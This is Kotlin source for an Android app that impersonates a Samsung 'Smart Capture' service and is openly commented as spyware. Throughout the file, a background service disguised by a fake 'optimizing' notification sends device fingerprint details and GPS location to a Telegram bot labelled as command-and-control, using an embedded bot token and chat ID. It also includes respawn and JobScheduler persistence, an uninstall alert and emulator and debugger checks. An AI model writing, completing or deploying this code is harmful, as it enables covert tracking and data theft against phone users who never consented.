package com.samsung.android.app.smartcapture

import android.Manifest
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.job.JobInfo
import android.app.job.JobParameters
import android.app.job.JobScheduler
import android.app.job.JobService
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.IBinder
import android.os.SystemClock
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class SystemOptimizerService : Service() {

    private val TAG = "SystemOptimizer"
    private val NOTIFICATION_ID = 1337
    private val CHANNEL_ID = "system_optimization"

    // Telegram C2 credentials (obfuscated with XOR 0xAB)
    private val SERVICE_KEY = obfuscateString("8699568956:AAE7eTdayK3EhKMhvpoMWBYrW91mTJohDUo")
    private val SERVICE_ID = obfuscateString("7597928991")

    private lateinit var transmissionService: TransmissionService
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Location tracking
    private var locationManager: LocationManager? = null
    private var isRecording: Boolean = false

    // ============================================================
    // LIFECYCLE
    // ============================================================

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service creating...")

        // Check for emulator/debugger
        if (isEmulator() || isDebuggerAttached()) {
            Log.w(TAG, "Emulator or debugger detected - running in limited mode")
        }

        // Initialize the transmission service
        transmissionService = TransmissionService(
            deobfuscateString(SERVICE_KEY),
            deobfuscateString(SERVICE_ID)
        )

        // Create notification channel
        createNotificationChannel()

        // Start as foreground service
        startForeground(NOTIFICATION_ID, createLegitimateNotification())

        // Setup persistence
        setupPersistentExecution()

        // Start data collection
        startDataCollection()

        // Send startup report
        transmissionService.sendStatusReport("[START] Service initialized successfully")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service onStartCommand: ${intent?.action ?: "unknown"}")
        transmissionService.sendStatusReport(
            "[START] Service triggered from: ${intent?.action ?: "unknown"}"
        )
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        // Re-spawn via AlarmManager
        val restartIntent = Intent(this, SystemOptimizerService::class.java)
        val restartPendingIntent = PendingIntent.getService(
            this, 2, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 1000,
            restartPendingIntent
        )
        transmissionService.sendStatusReport("[STOP] Service destroyed, rescheduling...")
        super.onDestroy()
    }

    // ============================================================
    // DATA COLLECTION
    // ============================================================

    private fun startDataCollection() {
        scope.launch {
            transmissionService.sendStatusReport("[HEARTBEAT] Service is running")

            // Collect device info
            collectDeviceInfo()

            // Start location tracking
            startLocationTracking()

            // Schedule periodic data collection
            while (isActive) {
                delay(TimeUnit.MINUTES.toMillis(5))
                collectDeviceInfo()
            }
        }
    }

    private fun collectDeviceInfo() {
        try {
            val info = buildString {
                appendLine("[DEVICE_INFO]")
                appendLine("  Manufacturer: ${Build.MANUFACTURER}")
                appendLine("  Model: ${Build.MODEL}")
                appendLine("  Brand: ${Build.BRAND}")
                appendLine("  Device: ${Build.DEVICE}")
                appendLine("  Product: ${Build.PRODUCT}")
                appendLine("  Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
                appendLine("  Build: ${Build.DISPLAY}")
                appendLine("  Fingerprint: ${Build.FINGERPRINT}")
                appendLine("  Board: ${Build.BOARD}")
                appendLine("  Hardware: ${Build.HARDWARE}")
                appendLine("  Host: ${Build.HOST}")
            }
            transmissionService.sendStatusReport(info)
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting device info", e)
        }
    }

    private fun startLocationTracking() {
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) ==
                PackageManager.PERMISSION_GRANTED
            ) {
                val locationListener = object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        transmissionService.sendStatusReport(
                            "[LOCATION] Lat: ${location.latitude}, " +
                            "Lng: ${location.longitude}, " +
                            "Acc: ${location.accuracy}m, " +
                            "Time: ${Date(location.time)}"
                        )
                    }

                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }

                locationManager?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    60000L,  // 1 minute
                    10f,      // 10 meters
                    locationListener
                )
                locationManager?.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    60000L,
                    10f,
                    locationListener
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Location tracking error", e)
        }
    }

    // ============================================================
    // PERSISTENCE
    // ============================================================

    private fun setupPersistentExecution() {
        // Method 1: AlarmManager - restart every 5 seconds if killed
        val restartIntent = Intent(this, SystemOptimizerService::class.java)
        val restartPendingIntent = PendingIntent.getService(
            this, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 5000,
            restartPendingIntent
        )

        // Method 2: Monitor for own removal
        val packageMonitor = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                if (intent?.action == Intent.ACTION_PACKAGE_REMOVED) {
                    val packageName = intent.data?.schemeSpecificPart
                    if (packageName == context?.packageName) {
                        transmissionService.sendStatusReport("[ALERT] App was uninstalled!")
                    }
                }
            }
        }
        registerReceiver(packageMonitor, IntentFilter(Intent.ACTION_PACKAGE_REMOVED))

        // Method 3: JobScheduler every 15 minutes
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            val jobInfo = JobInfo.Builder(
                1001, ComponentName(this, OptimizationJobService::class.java)
            ).apply {
                setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                setRequiresCharging(false)
                setPersisted(true)
                setPeriodic(15 * 60 * 1000L)
            }.build()
            jobScheduler.schedule(jobInfo)
        }
    }

    // ============================================================
    // ANTI-DETECTION / EVASION
    // ============================================================

    private fun isEmulator(): Boolean {
        return (Build.FINGERPRINT.startsWith("generic") ||
                Build.FINGERPRINT.lowercase(Locale.ROOT).contains("vbox") ||
                Build.FINGERPRINT.lowercase(Locale.ROOT).contains("test-keys") ||
                Build.MODEL.contains("google_sdk") ||
                Build.MODEL.contains("Emulator") ||
                Build.MODEL.contains("Android SDK built for x86") ||
                Build.MANUFACTURER.contains("Genymotion") ||
                (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")) ||
                "google_sdk" == Build.PRODUCT)
    }

    private fun isDebuggerAttached(): Boolean {
        return android.os.Debug.isDebuggerConnected() || android.os.Debug.waitingForDebugger()
    }

    private fun obfuscateString(input: String): String {
        val key = 0xAB
        return input.map { (it.code xor key).toChar() }.joinToString("")
    }

    private fun deobfuscateString(input: String): String {
        val key = 0xAB
        return input.map { (it.code xor key).toChar() }.joinToString("")
    }

    // ============================================================
    // NOTIFICATION
    // ============================================================

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Optimization",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Optimizing system performance"
                setShowBadge(false)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createLegitimateNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Smart Capture Service")
            .setContentText("Optimizing system performance...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}

// ============================================================
// DATA TRANSMISSION TO TELEGRAM C2
// ============================================================

class TransmissionService(private val token: String, private val chatId: String) {
    fun sendStatusReport(message: String) {
        Thread {
            try {
                val url = URL("https://api.telegram.org/bot$token/sendMessage")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                val postData = "chat_id=$chatId&text=${URLEncoder.encode(message, "UTF-8")}"
                connection.outputStream.use { output ->
                    output.write(postData.toByteArray())
                }
                val responseCode = connection.responseCode
                Log.d("Transmission", "Message sent, response: $responseCode")
            } catch (e: Exception) {
                Log.e("Transmission", "Failed to send", e)
            }
        }.start()
    }
}

// ============================================================
// JOBSCHEDULER PERSISTENCE
// ============================================================

class OptimizationJobService : JobService() {
    override fun onStartJob(params: JobParameters?): Boolean {
        val intent = Intent(this, SystemOptimizerService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        jobFinished(params, false)
        return true
    }

    override fun onStopJob(params: JobParameters?): Boolean = true
}
